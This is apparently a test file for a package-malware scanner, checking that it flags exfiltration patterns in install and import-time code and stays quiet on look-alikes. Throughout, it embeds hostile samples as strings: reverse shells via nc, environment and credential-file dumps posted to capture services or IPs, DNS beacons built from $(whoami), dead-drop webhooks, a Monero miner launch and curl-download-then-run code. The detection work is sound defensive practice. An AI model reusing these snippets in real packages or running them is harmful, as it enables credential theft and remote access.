"""0.1.8: exfiltration shapes the rerun's misses showed (the releases GuardDog
caught and Lazaret didn't), strong wherever found — install scripts,
import-time code, the files a package runs when used:

* a request to a webhook whose secret is written in the code (any service:
  a Telegram bot's token, a Discord webhook's, a Slack webhook's key in the
  URL's path, or in a name a template's hole gives it);
* three or more credential folders named in one place (.ssh, .aws, .ethereum
  …), with network calls: a sweep of the home folder;
* the machine's user or host name sent to an address kept base64-encoded, or
  in a DNS lookup of a name the code builds;
* at import time, local data read as a flow (a credential file, the host
  name, the public IP address a lookup service answers, the whole
  environment) sent to a data-capture service (an ngrok tunnel's own address
  counts as one) or a raw public IP address: the list is where the data
  goes, not a sign on its own;
* a reverse shell given as an argument list, or to an ngrok TCP address;
* a cryptocurrency miner (a Monero wallet address and a pool's arguments);
* curl or wget given `-o path` in an argument list, and the file run with
  Python (mistralai 2.4.6);
* at install time, a raw socket to a hard-coded address, and browser
  shortcuts rewritten to load an extension.

0.1.8 (the backlog's "what the exfiltration shapes don't read"):

* the DNS beacon's name built outside an f-string or a template literal —
  a sum, a %-format or a str.format(), a name assigned one of those, a
  lookup command written in code — or in a shell command whose host holds
  `$(whoami)`, $USER, %USERNAME% … (a reserved domain, .local or .internal,
  is a machine looking itself up);
* a dead drop: the host name sent to an address the code fetched at run
  time from a hard-coded URL (data-pipeline-check's webhooks);
* the host name read through require('os') or a name imported from it
  (@helpcentre/tesco-help: `require('os').hostname()`).

Each has crafted look-alikes that stay quiet. The secrets are fake and built
here rather than written out whole; hosts are .invalid or TEST-NET; nothing
runs. The native engine (which the npm package runs) is held to its
recorded outputs by tests/architecture/test_snapshot_signs.py.
"""
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core, engine

HOST_INFO = engine.pack_pattern("_HOST_INFO_RE")

TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
DISCORD = ("discord.com/api/webhooks/" + "123456789012345678/"
           + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01")
SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12"
XMR = "4" + ("AbCdEfGhJk" * 10)[:94]


def on_import(text, lang="py"):
    reasons, _line = core.import_time_risk(text, lang)
    return reasons, core.import_time_severity(reasons) if reasons else None


WEBHOOK = "sends data to a webhook whose secret is written in the code ({})"


class WebhookSecretTests(unittest.TestCase):
    """0.1.8: any service's webhook (0.1.7 knew Telegram's, Discord's and
    Slack's shapes): a credential in the path of a URL a request is given."""

    def test_a_telegram_bot_token_in_the_code(self):
        text = ("import requests\nTOKEN = '" + TG + "'\ndef initialize():\n"
                "    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument', files={'document': open(z, 'rb')})\n")
        self.assertEqual(on_import(text), ([WEBHOOK.format("api.telegram.org")], "CRITICAL"))
        inline = "import requests\nrequests.get(f'https://api.telegram.org/bot" + TG + "/sendMessage?text={m}')\n"
        self.assertEqual(on_import(inline)[1], "CRITICAL")
        shell = "const { exec } = require('child_process');\nconst T = '" + TG + "';\n" \
                "exec(`curl -s \"https://api.telegram.org/bot${T}/sendMessage?chat_id=1&text=${t}\"`);\n"
        self.assertEqual(on_import(shell, "js")[1], "CRITICAL")
        self.assertEqual(core.install_script_risk(text), [WEBHOOK.format("api.telegram.org"),
                                                          "contacts an address typical of data exfiltration "
                                                          "(api.telegram.org)"])

    def test_discord_and_slack_webhooks(self):
        self.assertEqual(on_import("const u = 'https://" + DISCORD + "';\nfetch(u, { method: 'POST' });\n", "js"),
                         ([WEBHOOK.format("discord.com")], "CRITICAL"))
        self.assertEqual(on_import("var webhookUrl = 'https://" + SLACK + "';\nawait fetch(webhookUrl, {});\n", "js"),
                         ([WEBHOOK.format("hooks.slack.com")], "CRITICAL"))

    def test_any_service_and_the_scripts_own_wrapper(self):
        key = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6"
        wrapper = ("import requests\nHOOK = 'https://hooks.x.invalid/in/" + key + "'\n"
                   "def send(url, payload):\n    return requests.post(url, json=payload)\n"
                   "send(HOOK, {'m': 1})\n")
        self.assertEqual(on_import(wrapper), ([WEBHOOK.format("hooks.x.invalid")], "CRITICAL"))
        xhr = ("const x = new XMLHttpRequest();\nx.open('POST', 'https://in.x.invalid/w/" + key + "');\nx.send(d);\n")
        self.assertEqual(on_import(xhr, "js"), ([WEBHOOK.format("in.x.invalid")], "CRITICAL"))

    def test_quiet_without_a_secret_or_network_calls(self):
        for text in (
                # the token from the user's settings (tqdm's telegram contrib, healthchecks)
                "import requests\ndef send(token, chat):\n    requests.post(f'https://api.telegram.org/bot{token}/sendMessage')\n",
                "import os, requests\nTOKEN = os.environ['TG_TOKEN']\nrequests.post('https://api.telegram.org/bot' + TOKEN)\n",
                # a token-shaped string, no Telegram API
                "import requests\nKEY = '" + TG + "'\nrequests.get('https://x.invalid/')\n",
                # a token and the API, no network call
                "TOKEN = '" + TG + "'  # https://api.telegram.org\n",
                # placeholders
                "import requests\nrequests.post('https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "')\n",
                "import requests\nrequests.post('https://hooks.slack.com/services/T0000/B0000/abc')\n",
                "import requests\nrequests.post('https://discord.com/api/webhooks/{id}/{token}')\n",
                "import requests\nT = '123456789:AA" + "A" * 33 + "'\nrequests.post('https://api.telegram.org/bot' + T)\n",
                # a path of words, a slug, a hash, a document's id not requested
                "import requests\nrequests.post('https://x.invalid/api/v2/GetUserProfileInformation')\n",
                "import requests\nrequests.get('https://x.invalid/blog/my-project-release-notes-2024')\n",
                "import requests\nrequests.get('https://x.invalid/c/3f2a1b4c5d6e7f8091a2b3c4d5e6f708')\n",
                "DOC = 'https://docs.x.invalid/d/" + "Zx9Qw7Er5Ty3Ui1Op0As2Df4Gh6" + "/edit'\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text)[0], [])


class CredentialTests(unittest.TestCase):
    def test_credential_files_sent_to_an_ip_address(self):
        # (0.1.8: the file's flow into the request, and the address it goes to)
        text = ("const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
                "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n"
                "const n = fs.readFileSync('~/.npmrc', 'utf8');\n")
        self.assertEqual(on_import(text, "js"), (["reads local files and sends them to an IP address "
                                                   "(203.0.113.9)"], "CRITICAL"))

    def test_a_sweep_of_credential_folders(self):
        text = ("import os, re, urllib.request\n_HOME = os.path.expanduser('~')\n"
                "_SCAN_DIRS = [os.path.join(_HOME, d) for d in ['.ssh', '.aws', '.ethereum', '.config', '.docker', '.kube']]\n"
                "def report(wh, data):\n    urllib.request.urlopen(urllib.request.Request(wh, data=data))\n")
        self.assertEqual(on_import(text), (["collects files from several credential folders and sends data over the "
                                            "network (.ssh, .aws, .ethereum, .docker)"], "CRITICAL"))

    def test_quiet_look_alikes(self):
        for text in (
                # dotenv and a private address; a public address and no credential file
                "const fs = require('fs');\nconst d = fs.readFileSync('.env');\nfetch('http://10.0.0.5:8080/cfg');\n",
                "const fs = require('fs');\nfetch('https://203.0.113.9/health');\nfs.readFileSync('config.json');\n",
                # two folders; three without network calls; three far apart
                "import requests\nPATHS = ['.ssh', '.aws']\n",
                "BACKUP = ['.ssh', '.aws', '.gnupg']\n",
                "import requests\nA = '.ssh'\n" + "x = 1\n" * 200 + "B = '.aws'\n" + "y = 2\n" * 200 + "C = '.kube'\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text, "js" if "const" in text else "py")[0], [])


class HostAndAddressTests(unittest.TestCase):
    def test_the_host_name_sent_to_an_address_hidden_in_base64(self):
        text = ("import socket, base64, ssl, urllib.request\nhostname = socket.gethostname()\n"
                "u1 = 'aHR0cHM6Ly9h'\nu2 = 'LmludmFsaWQ='\n"
                "url = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}'\nurllib.request.urlopen(url)\n")
        self.assertEqual(on_import(text), (["sends the machine's user or host name to an address it hides in base64"],
                                           "CRITICAL"))

    def test_the_dns_beacon(self):
        setup = ("import re, socket, getpass\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
                 "def b():\n    h = re.sub(r'[^a-z0-9-]', '', socket.gethostname().lower())[:15]\n"
                 "    u = getpass.getuser()\n    socket.getaddrinfo(f\"{h}.{u}.beacon.x.invalid.com\", 80)\n")
        self.assertIn("sends the machine's user or host name in a DNS lookup of a name it builds",
                      core.install_script_risk(setup))
        js = "const dns = require('dns');\nconst os = require('os');\ndns.lookup(`${os.hostname()}.c.x.invalid.com`, cb);\n"
        self.assertEqual(on_import(js, "js")[1], "CRITICAL")

    def test_the_public_ip_address_to_a_capture_service(self):
        # (0.1.8: what a lookup service answers is the machine's public IP address, a local datum)
        text = ("import threading, os, platform, requests\ndef _notify():\n"
                "    ip = requests.get('https://api.ipify.org', timeout=2).text\n"
                "    requests.post('https://webhook.site/0000-1111', json={'os': platform.platform(), 'ip': ip})\n"
                "threading.Thread(target=_notify, daemon=True).start()\n")
        self.assertEqual(on_import(text), (["sends the machine's public IP address to a data-capture service "
                                            "(webhook.site)"], "CRITICAL"))

    def test_an_ngrok_tunnels_address_is_a_capture_service(self):
        text = ("const { exec } = require('child_process');\n"
                "exec(`curl -X POST \"https://7195e44e.ngrok-free.app/t/$(whoami)/$(hostname)/\"`, () => {});\n")
        self.assertEqual(on_import(text, "js"), (["sends the machine's user or host name to a data-capture service "
                                                   "(7195e44e.ngrok-free.app)"], "CRITICAL"))

    def test_quiet_look_alikes(self):
        for text in (
                # the host name and a base64 literal that isn't an address; a DNS lookup of a fixed name
                "import socket, base64, requests\nh = socket.gethostname()\nk = base64.b64decode('QUJDRA==')\nrequests.get(u)\n",
                "import socket\nh = socket.gethostname()\nsocket.getaddrinfo('pypi.org', 443)\n",
                "import socket\nsocket.gethostbyname(f'{name}.svc.cluster.local')\n",        # no host information
                # a public IP address looked up for a mirror, no capture service
                "import requests\nip = requests.get('https://ipinfo.io/json').json()\nrequests.get(MIRRORS[ip['country']])\n",
                # ngrok's own API and a client that names the service
                "import socket, requests\nh = socket.gethostname()\nrequests.get('https://api.ngrok.com/tunnels')\n",
                # the host name and a capture service in one file, the host name not sent (0.1.7 made this CRITICAL)
                "import socket, requests\nh = socket.gethostname()\nprint(h)\nrequests.get('https://webhook.site/x')\n"):
            with self.subTest(text[:60]):
                self.assertEqual(on_import(text)[0], [])


class BuiltNamesAndDeadDropTests(unittest.TestCase):
    """0.1.8: the DNS beacon's name built outside a template, a dead drop, the
    host name through require('os')."""
    DNS = "sends the machine's user or host name in a DNS lookup of a name it builds"

    def test_names_built_in_code(self):
        for text, lang in (
                ("const os = require('os');\nconst dns = require('dns');\nconst h = os.hostname();\n"
                 "dns.lookup(h + '.u.x.invalid.com', () => {});\n", "js"),
                ("const os = require('os'), dns = require('dns');\nconst q = os.hostname() + '.x.invalid.com';\n"
                 "dns.resolve(q, () => {});\n", "js"),
                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('%s.x.invalid.com' % h)\n", "py"),
                ("import socket\nh = socket.gethostname()\nsocket.gethostbyname('{}.x.invalid.com'.format(h))\n", "py"),
                ("import socket, getpass\nh = socket.gethostname()\nq = f'{h}.{getpass.getuser()}.x.invalid.com'\n"
                 "socket.getaddrinfo(q, 80)\n", "py"),
                ("import os, socket\nos.system('nslookup ' + socket.gethostname() + '.x.invalid.com')\n", "py"),
                ("import os, socket\nh = socket.gethostname()\nos.system(f'ping -c 1 {h}.x.invalid.com')\n", "py")):
            with self.subTest(text=text):
                reasons, sev = on_import(text, lang)
                self.assertIn(self.DNS, reasons)
                self.assertEqual(sev, "CRITICAL")

    def test_names_built_in_a_shell_command(self):
        for cmd in ("nslookup $(whoami).$(hostname).x.invalid.com", "ping -c 1 `whoami`.x.invalid.com",
                    "curl -s http://$(whoami).x.invalid.com/p", "nslookup %USERNAME%.%COMPUTERNAME%.x.invalid.com",
                    "dig $USER.x.invalid.com", "Resolve-DnsName $env:COMPUTERNAME.x.invalid.com"):
            with self.subTest(cmd=cmd):
                self.assertIn(self.DNS, core.install_script_risk(cmd))

    def test_quiet_look_alikes(self):
        # a machine looking itself up; a reserved domain; an assignment, not a lookup; the identity in a
        # path; a service record of a zone; constants only
        for text in ("import socket\nip = socket.gethostbyname(socket.gethostname())\n",
                     "import socket\nip = socket.gethostbyname(socket.gethostname() + '.local')\n",
                     "const os = require('os'), dns = require('dns');\ndns.lookup(os.hostname() + '.internal', cb);\n",
                     "ping -c 1 $(hostname).local", "host=$(hostname).x.invalid.com",
                     "curl -s http://x.invalid.com/$(whoami)",
                     "const os = require('os'), dns = require('dns');\ndns.resolveSrv('_http._tcp.' + zone, cb);\n"
                     "os.hostname();\n",
                     "import socket\nh = socket.gethostname()\nsocket.gethostbyname('api' + '.x.invalid.com')\n"):
            with self.subTest(text=text):
                self.assertEqual(core.dns_beacon_at(text, HOST_INFO.search(text) is not None), -1)

    def test_a_dead_drop(self):
        want = "sends the machine's user or host name to an address it fetches at run time (from {})"
        for text, lang, host in (
                ("import requests, socket\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
                 "requests.post(cfg['url'], json={'h': socket.gethostname()})\n", "py", "pastebin.com"),
                ("import json, socket, urllib.request\n_W = None\ndef hooks():\n    global _W\n"
                 "    req = urllib.request.Request('https://x.github.io/c.json')\n"
                 "    cfg = json.loads(urllib.request.urlopen(req).read())\n    _W = cfg.get('webhooks', [])\n"
                 "    return _W\ndef send():\n    for w in hooks()[:2]:\n        urllib.request.urlopen("
                 "urllib.request.Request(w, data=socket.gethostname().encode(), method='POST'))\n", "py", "x.github.io"),
                ("const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json()).then((c) => "
                 "fetch(c.hook, { method: 'POST', body: JSON.stringify({ h: os.hostname() }) }));\n", "js",
                 "x.github.io"),
                ("const os = require('os'), axios = require('axios');\n(async () => { const { data } = await axios.get("
                 "'https://gist.githubusercontent.com/u/x/raw/c.json'); await axios.post(data.url, "
                 "{ h: os.hostname() }); })();\n", "js", "gist.githubusercontent.com"),
                ("const os = require('os'), https = require('https');\nconst CFG = 'https://x.github.io/c.json';\n"
                 "https.get(CFG, (res) => { let b = ''; res.on('data', (d) => b += d); res.on('end', () => { "
                 "const c = JSON.parse(b); const r = https.request(c.url, { method: 'POST' }); r.write(os.hostname()); "
                 "r.end(); }); });\n", "js", "x.github.io")):
            with self.subTest(text=text):
                reasons, sev = on_import(text, lang)
                self.assertIn(want.format(host), reasons)
                self.assertEqual(sev, "CRITICAL")
                self.assertIn(want.format(host), core.install_script_risk(text))

    def test_dead_drop_look_alikes(self):
        # a GET of the address; a literal address; a fetch of no literal URL; an update check; an Express
        # route; no host name read
        for text in ("import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
                     "requests.get(cfg['url'])\nsocket.gethostname()\n",
                     "import requests, socket\ncfg = requests.get('https://x.github.io/c.json').json()\n"
                     "requests.post('https://api.x.invalid/x', json=cfg)\nsocket.gethostname()\n",
                     "import requests, socket\ncfg = requests.get(base + '/c.json').json()\n"
                     "requests.post(cfg['url'], json={'h': socket.gethostname()})\n",
                     "const os = require('os');\nfetch('https://registry.npmjs.org/x/latest').then((r) => r.json())"
                     ".then((j) => { if (j.version !== v) console.log('update', j.version); });\nos.hostname();\n",
                     "const os = require('os');\nfetch('https://x.github.io/c.json').then((r) => r.json())"
                     ".then((c) => { app.post(c.path, h); });\nos.hostname();\n"):
            with self.subTest(text=text):
                self.assertIsNone(core.dead_drop_at(text))
        quiet = ("import requests\ncfg = requests.get('https://pastebin.com/raw/abc').json()\n"
                 "requests.post(cfg['url'], json={'v': 1})\n")
        self.assertIsNotNone(core.dead_drop_at(quiet))                 # the shape, but no host name read:
        self.assertEqual(on_import(quiet), ([], None))                  # not a sign

    def test_the_host_name_through_require_os(self):
        for text in ("const req = require('https').request('https://x.invalid/', { method: 'POST' }, () => {});\n"
                     "req.end(JSON.stringify({ h: require('os').hostname(), c: process.cwd() }));\n",
                     "const { hostname, platform } = require('os');\n"
                     "fetch('https://x.invalid/', { method: 'POST', body: hostname() });\n",
                     "import { userInfo } from 'node:os';\nfetch('https://x.invalid/', { method: 'POST', "
                     "body: userInfo().username });\n",
                     "from socket import gethostname\nimport requests\nrequests.post('https://x.invalid/', "
                     "data=gethostname())\n"):
            with self.subTest(text=text):
                self.assertIn("sends the machine's user or host name over the network", core.install_script_risk(text))
        self.assertEqual(core.install_script_risk("const { a, b } = require('os');\nfetch('https://x.invalid/');\n"),
                         [])


class RequestBinTests(unittest.TestCase):
    """RequestBin counts by its host names only: chromedriver's and
    phantomjs-prebuilt's installers define requestBinary() to download their
    binaries, and the bare word made each an exfiltration address (0.1.7), so
    their install hooks were CRITICAL and the guard blocked chromedriver."""

    def test_request_binary_is_not_requestbin(self):
        installer = ("const request = require('request');\n"
                     "function requestBinary(requestOptions, filePath) {\n"
                     "  return new Promise((resolve) => request(requestOptions).pipe(fs.createWriteStream(filePath)));\n}\n"
                     "requestBinary(getRequestOptions(), downloadedFile).then(extractDownload);\n")
        self.assertEqual(core.install_script_risk(installer), [])
        self.assertEqual(core.capture_service(installer), None)

    def test_its_addresses_still_count(self):
        for host in ("requestbin.com", "enx1.x.requestbin.net", "requestbin.io", "requestb.in"):
            with self.subTest(host):
                text = f"const https = require('https');\nhttps.get('https://{host}/r/abc?d=' + process.env.NPM_TOKEN);\n"
                # (0.1.8: a token in a request's address counts where the address is a capture service's)
                self.assertEqual(core.install_script_risk(text),
                                 ["sends environment variables over the network (NPM_TOKEN)",
                                  f"contacts an address typical of data exfiltration ({host.split('x.')[-1]})"])
        mirror = "const https = require('https');\nhttps.get('https://mirror.x.invalid/d?t=' + process.env.NPM_TOKEN);\n"
        self.assertEqual(core.install_script_risk(mirror), [])
        beacon = ("import socket, requests\n"
                  "requests.post('https://requestbin.net/r/abc', data=socket.gethostname())\n")
        self.assertEqual(on_import(beacon), (["sends the machine's user or host name to a data-capture service "
                                              "(requestbin.net)"], "CRITICAL"))


class EnvironmentCopyTests(unittest.TestCase):
    def test_a_copy_of_the_environment_serialized(self):
        text = ("import os\nimport urllib.request\nimport urllib.parse\n\ndef run_payload():\n"
                "    data = dict(os.environ)\n    encoded = urllib.parse.urlencode(data).encode('utf-8')\n"
                "    url = 'https://5cecdbdb.ngrok.app/collect'\n"
                "    urllib.request.urlopen(urllib.request.Request(url, data=encoded))\n")
        self.assertEqual(on_import(text), (["reads credentials or the whole environment and sends them to an "
                                            "exfiltration service (5cecdbdb.ngrok.app)"], "CRITICAL"))
        js = "const https = require('https');\nconst e = { ...process.env };\nconst body = JSON.stringify(e);\nhttps.request(o).end(body);\n"
        self.assertEqual(on_import(js, "js"), (["reads credentials or the whole environment and sends data over the "
                                                 "network"], "CRITICAL"))         # 2.17: sent anywhere

    def test_the_bytes_environment(self):
        # 2.17: os.environb is the environment too, and a variable read from
        # it is one variable, as from os.environ (pyarmor reads its proxy
        # setting with os.environb.get(b'http_proxy'))
        send = "import os, requests\nrequests.post('https://x.invalid/c', data=%s)\n"
        self.assertEqual(core.local_data_sent_at(send % "dict(os.environb)")[1:3],
                         ("environment", "the whole environment"))
        self.assertEqual(on_import(send % "dict(os.environb)")[1], "CRITICAL")
        for one in ("os.environb.get(b'EXAMPLE_TOKEN')", "os.environb[b'EXAMPLE_TOKEN']", "os.getenvb(b'EXAMPLE_TOKEN')"):
            with self.subTest(one):
                self.assertEqual(core.local_data_sent_at(send % one)[1:3], ("environment", "EXAMPLE_TOKEN"))
                self.assertEqual(on_import(send % one)[0], [])

    def test_a_copy_handed_to_a_subprocess_is_not_a_harvest(self):
        text = ("import os, subprocess, requests\nenv = dict(os.environ)\nenv['PATH'] = '/opt/bin'\n"
                "subprocess.run(['tool'], env=env)\nrequests.get(u)\n")
        self.assertEqual(on_import(text)[0], [])


class ShellMinerAndDownloadTests(unittest.TestCase):
    def test_reverse_shells_as_argument_lists(self):
        ngrok = "const { spawn } = require('child_process');\nspawn('bash', ['-i', 'nc', '2.tcp.eu.ngrok.io', '12151'], {});\n"
        self.assertEqual(on_import(ngrok, "js"), (["opens a reverse shell"], "CRITICAL"))
        args = "const cp = require('child_process');\ncp.spawn('nc', ['203.0.113.2', '4444', '-e', '/bin/sh']);\n"
        self.assertEqual(on_import(args, "js"), (["opens a reverse shell"], "CRITICAL"))
        self.assertEqual(on_import("const cp = require('child_process');\ncp.spawn('nc', ['-l', '8080']);\n", "js")[0], [])

    def test_a_miner(self):
        text = ("import os, subprocess\ndef safe_run(path):\n    os.chmod(path, 0o770)\n"
                "    command = [path, '-u', '" + XMR + "', '-o', 'pool.x.invalid:8080', '-k']\n"
                "    subprocess.Popen(command, stdin=subprocess.DEVNULL, preexec_fn=os.setsid)\n")
        reasons, sev = on_import(text)
        self.assertIn("runs a cryptocurrency miner (a Monero wallet address)", reasons)
        self.assertEqual(sev, "CRITICAL")
        for quiet in ("ADDRESS = '" + XMR + "'  # a donation address\n",            # an address, no miner
                      "import subprocess\nsubprocess.run(['tool', '-o', 'out.txt'])\n"):  # arguments, no address
            with self.subTest(quiet[:40]):
                self.assertEqual(on_import(quiet)[0], [])

    def test_curl_in_an_argument_list_then_run_with_python(self):
        text = ("import sys as _sys\nimport subprocess as _sub\nimport os as _os\n\ndef _run_background_task():\n"
                "    _url = 'https://203.0.113.4/transformers.pyz'\n    _dest = '/tmp/transformers.pyz'\n"
                "    if not _os.path.exists(_dest):\n"
                "        _sub.run(['curl', '-k', '-L', '-s', _url, '-o', _dest], timeout=15)\n"
                "    if _os.path.exists(_dest):\n"
                "        _sub.Popen([_sys.executable, _dest], start_new_session=True)\n\n_run_background_task()\n")
        self.assertEqual(on_import(text), (["downloads a script and runs it with Python"], "CRITICAL"))
        # a binary downloaded and run on its own stays the installer's MAJOR shape
        binary = text.replace("[_sys.executable, _dest]", "[_dest, '--version']")
        self.assertEqual(on_import(binary), (["downloads a file and then runs it"], "MAJOR"))


class BoundedWorkTests(unittest.TestCase):
    def test_hostile_inputs_finish_fast(self):
        """Each shape examines a bounded number of matches, and none of its
        patterns backtracks on a long run of what it looks for."""
        import time
        texts = {
            "tokens": "import requests\napi.telegram.org\n" + ("'123456789:AA" + "A" * 33 + "', ") * 20000,
            "ip literals": "connect\n" + "'203.0.113.7', " * 50000,
            "credential folders": "import requests\n" + "'.ssh', x, " * 30000,
            "environment copies": "import os\n" + "e = dict(os.environ)\n" * 20000 + "x" + " " * 100000,
            "dns lookups": "import socket\nsocket.gethostname()\n" + "getaddrinfo(f'{a}" + "b" * 200 + "', 1)\n" * 5000,
            "reverse shell args": "'nc'" + " '-x'," * 50000,
            "monero": "'-o' exec(" + ("4" + "a" * 93 + "! ") * 5000,
            "a long line": "getaddrinfo(f\"" + "{a}." * 50000 + "\n",
            "dead drop fetches": "import socket\nsocket.gethostname()\n"
                                 + "c = requests.get('https://x.invalid/c').json()\n" * 5000
                                 + "requests.post(c['u'], data=1)\n" * 5000,
            "dead drop chains": "const os = require('os');\nos.hostname();\nfetch('https://x.invalid/c')"
                                + ".then((r) => r)" * 50000 + "\n",
            "dead drop one line": "import socket\nsocket.gethostname()\nc = urlopen('https://x.invalid/c')\nx = c"
                                  + " + c" * 200000 + "\n",
            "dns assigned names": "import socket\nsocket.gethostname()\n" + "q = h + '.x.invalid.com'\n" * 20000
                                  + "socket.gethostbyname(q)\n" * 20000,
            "dns shell identities": "nslookup " + "$(whoami)" * 100000 + "\n" + "echo "
                                    + "$(whoami).x.invalid.com " * 50000,
        }
        for label, text in texts.items():
            with self.subTest(label):
                start = time.perf_counter()
                core.import_time_risk(text, "py")
                core.install_script_risk(text)
                self.assertLess(time.perf_counter() - start, 5.0)


class InstallTimeTests(unittest.TestCase):
    def test_a_raw_socket_to_a_hard_coded_address(self):
        setup = ("import socket\nfrom setuptools.command.install import install\nclass P(install):\n"
                 "    def run(self):\n        ip = '203.0.113.5'\n        port = 12345\n"
                 "        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, port))\n")
        self.assertIn("contacts an address typical of data exfiltration (203.0.113.5)", core.install_script_risk(setup))
        self.assertIn("contacts an address typical of data exfiltration (172.16.0.103)",
                      core.install_script_risk(setup.replace("203.0.113.5", "172.16.0.103")))
        for quiet in (setup.replace("203.0.113.5", "127.0.0.1"), setup.replace("203.0.113.5", "8.8.8.8"),
                      "VERSION = '1.2.3.4'\n"):
            with self.subTest(quiet[-40:]):
                self.assertEqual([r for r in core.install_script_risk(quiet) if "exfiltration" in r], [])
        # not at import time: a client connects to addresses
        self.assertEqual(on_import(setup)[0], [])

    def test_shortcuts_rewritten(self):
        """0.1.8: the shortcuts a machine has, found and changed — whatever
        they are made to start (python-dateuti: a browser extension)."""
        reason = "rewrites the shortcuts of programs on the machine"
        setup = ("from win32com.client import Dispatch\nshell = Dispatch('WScript.Shell')\n"
                 "for f in files:\n    if f.endswith('.lnk'):\n        s = shell.CreateShortcut(root + f)\n"
                 "        s.Arguments = '--load-extension={p}\\\\Extension'\n        s.Save()\n")
        self.assertIn(reason, core.install_script_risk(setup))
        self.assertIn(reason, core.install_script_risk(setup.replace("'--load-extension={p}\\\\Extension'", "'/c x.exe'")))
        self.assertIn(reason, core.install_script_risk(
            "for (const f of glob.sync('*.lnk')) { const s = sh.CreateShortcut(f); s.TargetPath = exe; s.Save(); }"))
        selenium = "from selenium import webdriver\no = webdriver.ChromeOptions()\no.add_argument('--load-extension=ext')\n"
        self.assertNotIn(reason, core.install_script_risk(selenium))
        own = ("s = shell.CreateShortcut(os.path.join(desktop, 'MyApp.lnk'))\ns.TargetPath = exe\ns.Save()\n")
        self.assertNotIn(reason, core.install_script_risk(own))     # an installer's own shortcut


class TaggedTemplateWrapperTests(unittest.TestCase):
    """PANIC-TAGGED (0.1.9, Oct 18): a tagged template call of a script's wrapper of exec or of its getEnv() made the
    engine panic once the tree held more nodes than list slots (@epoch32/visage 1.14.0's bundle): its readers took the
    template's slot as the call's argument list. Now the tag's first parameter is the template's strings, read as
    their text when the template is one piece. Twin of exfiltration.test.js's."""

    PAD = "0;\n" * 3000                     # statements before the call: more nodes than list slots
    EXEC = ("const { execSync } = require('child_process');\n"
            "function run(c) { try { return execSync(String(c)).toString(); } catch { return ''; } }\n")
    ENV = "function getEnv(n) { return process.env[n]; }\n"

    @staticmethod
    def post(v):
        return "fetch('https://collect.invalid/c', { method: 'POST', body: %s });\n" % v

    def risk(self, text):
        return core.install_script_risk(self.PAD + text, lang="js")

    def test_the_template_is_the_command_or_the_name(self):
        self.assertEqual(self.risk(self.EXEC + self.post("run`whoami`")),
                         ["sends the machine's user or host name over the network"])
        self.assertEqual(self.risk(self.ENV + self.post("getEnv`AWS_SECRET_ACCESS_KEY`")),
                         ["sends environment variables over the network (AWS_SECRET_ACCESS_KEY)"])

    def test_no_constant_text_no_source_and_no_failure(self):
        self.assertEqual(self.risk(self.EXEC + "const w = 'who';\n" + self.post("run`${w}ami`")), [])
        self.assertEqual(self.risk(self.ENV + self.post("getEnv`HOST`")), [])

    def test_a_call_as_before(self):
        self.assertEqual(self.risk(self.EXEC + self.post("run('whoami')")),
                         ["sends the machine's user or host name over the network"])


class FetchFallbackTests(unittest.TestCase):
    """D-21 (0.1.9): the platform's fetch, and a helper's fallback to it from a parameter (`customFetch ?? fetch`,
    inspect-ai's view bundle), were found by name to be any function of the script's called `fetch` too (a class's
    method), so on the tree the call returned what it was given: a route under a system folder (`/data/…`) was a
    path, and a reader given the response read a file outside the package. Reworked after an independent review: the
    local fallback/write/class checks do not exclude startup replacements. The old reading therefore stays,
    including a lone file and the unused Store twin. Twin of exfiltration.test.js's."""

    STORE = "class Store { fetch(k) { return k; } }\n"
    SENT = "reads files outside the package and sends them over the network ({})"
    TOP = "const fs = require('fs');\nconst https = require('https');\n"
    SEND = "  https.request('https://collect.invalid/c', { method: 'POST' }).end(v);\n"

    def helper(self, sig, pick, defs="", call="get('/data/list')"):
        return ("const https = require('https');\n" + defs + f"async function get(u, {sig}) {{\n  const fetchFn = {pick};\n"
                "  const r = await fetchFn(u);\n  return r.text();\n}\n"
                f"async function go(reader) {{\n  const body = await {call};\n"
                "  const v = await reader.readFile(body);\n" + self.SEND + "}\ngo(globalThis.zip);\n")

    def test_a_lone_file_keeps_unknown_startup_reading(self):
        for sig, pick in (("c", "fetch"), ("customFetch", "customFetch ?? fetch"), ("customFetch", "customFetch || fetch"),
                          ("opts = {}", "opts.fetch ?? globalThis.fetch"), ("{ customFetch } = {}", "customFetch ?? fetch")):
            with self.subTest(pick):
                self.assertEqual(core.install_script_risk(self.helper(sig, pick, self.STORE), lang="js"), [self.SENT.format("/data/list")])

    def test_startup_replacements_keep_project_hook_critical(self):
        import json
        import tempfile
        from pathlib import Path
        text = self.helper("customFetch", "customFetch ?? fetch", self.STORE).replace(
            "go(globalThis.zip)", "go(require('fs').promises)")
        for mode, command in (("preload", "node -r ./shim.js install.js"),
                              ("node_options", 'NODE_OPTIONS="--require ./shim.js" node install.js'),
                              ("earlier", "node -r ./bootstrap.js install.js"),
                              ("other_file", "node install.js"), ("unknown", "node install.js")):
            with self.subTest(mode=mode), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                (root / "package.json").write_text(json.dumps({
                    "name": "inert-review-fixture", "version": "1.0.0",
                    "scripts": {"postinstall": command}}), encoding="utf-8")
                (root / "shim.js").write_text("globalThis.fetch = async k => ({text: async () => k});\n", encoding="utf-8")
                (root / "bootstrap.js").write_text("require('./shim.js');\n", encoding="utf-8")
